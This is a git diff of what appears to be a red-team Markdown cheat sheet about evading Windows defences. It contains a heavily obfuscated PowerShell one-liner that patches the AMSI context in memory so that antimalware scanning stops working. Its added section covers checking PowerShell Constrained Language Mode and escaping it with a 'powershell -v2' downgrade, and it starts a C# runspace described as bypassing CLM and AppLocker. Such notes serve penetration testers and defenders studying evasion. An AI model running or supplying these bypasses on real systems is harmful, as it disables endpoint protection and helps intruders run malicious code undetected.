@@ -86,16 +86,27 @@ The end result which can bypass AMSI:
 ${/=\/==\_/===\_/==}=$null;${_/\__/\__/=\/=\_/}="$(('S'+'y'+'s'+'t'+'e'+'m').nOrMAlIze([ChAr](70*40/40)+[CHaR]([byte]0x6f)+[chAr](94+20)+[ChaR](109+62-62)+[ChAR](27+41)) -replace [chAr](92)+[CHaR]([BYTe]0x70)+[cHar](23+100)+[cHar]([byTe]0x4d)+[chAR]([bYtE]0x6e)+[cHar]([byte]0x7d)).$(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQDjAG4A4ABnAA==')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBtAGUAbgB0AA==')))).NOrmAliZE([CHAR]([BYTe]0x46)+[chAr](36+75)+[CHaR](114)+[cHAr](63+46)+[CHaR](17+51)) -replace [cHAR](41+51)+[ChAR](112*76/76)+[cHAr]([byTe]0x7b)+[cHar](77+13-13)+[chaR]([BYTe]0x6e)+[ChAR](125+9-9)).$([cHAR](65)+[CHaR]([BYte]0x75)+[CHAR](116+72-72)+[CHAR](67+44)+[chAR]([bytE]0x6d)+[chAr](97+9-9)+[Char](116*72/72)+[CHAr]([byte]0x69)+[Char]([byTe]0x6f)+[chaR]([Byte]0x6e)).$([CHAR]([BYte]0x41)+[char]([ByTe]0x6d)+[cHAr](115+39-39)+[CHAR]([Byte]0x69)+[cHaR](85*12/12)+[chAR]([byte]0x74)+[ChaR](105*12/12)+[ChaR]([BytE]0x6c)+[char](115))";${_/=======\/==\/\/}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KwBbAGMASABhAFIAXQAoAFsAYgB5AFQARQBdADAAeAA2AGMAKQArAFsAQwBIAEEAcgBdACgAWwBCAFkAVABFAF0AMAB4ADcAMAApACsAWwBjAGgAQQByAF0AKABbAGIAeQB0AGUAXQAwAHgANwBhACkAKwBbAGMASABhAHIAXQAoAFsAYgBZAHQARQBdADAAeAA3ADQAKQArAFsAYwBIAEEAUgBdACgAMQAwADUAKQArAFsAQwBoAEEAUgBdACgAMQAxADgAKwAzADQALQAzADQAKQArAFsAYwBIAEEAUgBdACgAMQAwADEAKQArAFsAQwBIAEEAcgBdACgAOQA3ACkAKwBbAEMASABBAFIAXQAoAFsAQgB5AHQAZQBdADAAeAA2ADMAKQArAFsAYwBIAEEAUgBdACgAWwBCAHkAVABFAF0AMAB4ADYANQApACsAWwBDAEgAYQBSAF0AKAAxADAANgApACsAWwBDAGgAQQBSAF0AKABbAEIAWQB0AGUAXQAwAHgANwAzACkAKwBbAEMAaABBAFIAXQAoAFsAQgBZAHQAZQBdADAAeAA2ADEAKQArAFsAQwBIAGEAcgBdACgAMQAyADEAKwA0ADYALQA0ADYAKQArAFsAQwBoAGEAcgBdACgAWwBCAFkAVABlAF0AMAB4ADYAMQApACsAWwBDAEgAYQBSAF0AKAAxADAANgApACsAWwBjAGgAQQByAF0AKABbAEIAeQB0AGUAXQAwAHgANgA3ACkAKwBbAGMASABBAFIAXQAoADcAOAArADIAMQApACsAWwBDAEgAYQByAF0AKAAxADEAMQAqADcANwAvADcANwApACsAWwBDAEgAQQByAF0AKAA5ADEAKwAxADcAKQArAFsAQwBIAEEAUgBdACgAMQAxADEAKwAyADkALQAyADkAKQArAFsAQwBIAGEAUgBdACgAMQArADEAMAA2ACkAKwBbAEMAaABBAHIAXQAoADEAMQA1ACsANwA2AC0ANwA2ACkAKwBbAGMASABBAFIAXQAoADkAMgArADEAOQApACsAWwBjAGgAYQByAF0AKABbAGIAWQBUAGUAXQAwAHgANgA1ACkAKwBbAGMASABhAHIAXQAoAFsAYgB5AHQARQBdADAAeAA3AGEAKQArAFsAQwBIAEEAcgBdACgAOQA3ACoANAAwAC8ANAAwACkAKwBbAGMAaABhAHIAXQAoAFsAYgBZAFQARQBdADAAeAA2AGQAKQArAFsAYwBIAGEAUgBdACgAMQAxADAAKgAzADQALwAzADQAKQA=')));[Threading.Thread]::Sleep(851);[Runtime.InteropServices.Marshal]::("$(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAOwAdABlAA==')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('zgBuAHQAMwAyAA==')))).NOrmalize([CHaR](51+19)+[Char](111)+[cHAr](114*43/43)+[cHaR](75+34)+[CHAR]([bYTE]0x44)) -replace [cHar](70+22)+[chAR]([bYtE]0x70)+[Char](108+15)+[chAr]([byTE]0x4d)+[ChaR](110)+[CHar](125*16/16))")([Ref].Assembly.GetType(${_/\__/\__/=\/=\_/}).GetField("$([CHAR]([bYtE]0x61)+[CHaR]([bYtE]0x6d)+[CHar]([byTe]0x73)+[ChaR]([bytE]0x69)+[chAR]([ByTE]0x43)+[CHAR](62+49)+[CHaR](110+108-108)+[chAr]([ByTe]0x74)+[chAR]([BYte]0x65)+[cHAR]([BYTE]0x78)+[char]([ByTE]0x74))",[Reflection.BindingFlags]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).GetValue(${/=\/==\_/===\_/==}),0x32aaa0ce);
 ```
 
-# Bypass CLM 
+# Bypass Constrained Language Mode (CLM)
+
+## Check Powershell Language Mode
+
+```Powershell
+$ExecutionContext.SessionState.LanguageMode
+```
+
+## Bypass CLM by Downgrade Powershell
+
+Since Constrained Language Mode introduced in Powershell V3, downgrade to an older versions of Powershell should bypass CLM restrection. Just specify powershell version 2 by using the arguemnt `-v2` when run poweshell process. Note that it might not work in the most cases these days.
+
+```Powershell
+powershell -v2
+```
 
 ## Custom PowerShell Runspace written in C#
 
 Custom PowerShell runspcase enable attackers to bypass Constrained Language Mode (CLM) or if an Applocker policy is implemented.
 
 ```CSharp
-
-
-
 using System;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
